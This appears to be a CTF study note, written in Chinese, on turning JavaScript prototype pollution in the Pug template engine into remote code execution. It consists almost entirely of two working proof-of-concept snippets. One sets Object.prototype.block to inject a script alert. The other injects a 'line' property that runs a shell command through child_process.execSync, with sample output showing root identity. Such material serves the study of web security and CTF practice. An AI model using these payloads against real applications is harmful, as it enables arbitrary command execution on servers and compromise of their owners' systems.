tags:: [[CTFWEB/JS/原型链污染]]

- # 原型链污染到RCE
	- [参考](https://po6ix.github.io/AST-Injection/)
	- 检测
		- ```js
		  const pug = require('pug');
		  
		  Object.prototype.block = {"type":"Text","val":`<script>alert(origin)</script>`};
		  
		  const source = `h1= msg`;
		  
		  var fn = pug.compile(source, {});
		  var html = fn({msg: 'It works'});
		  
		  console.log(html); // <h1>It works<script>alert(origin)</script></h1>
		  
		  
		  ```
	- 利用
		- ```js
		  const pug = require('pug');
		  
		  Object.prototype.block = {"type": "Text", "line": "console.log(process.mainModule.require('child_process').execSync('id').toString())"};
		  
		  const source = `h1= msg`;
		  
		  var fn = pug.compile(source);
		  var html = fn({msg: 'It works'});
		  
		  console.log(html); // "uid=0(root) gid=0(root) groups=0(root)\n\n<h1>It worksndefine</h1>"
		  ```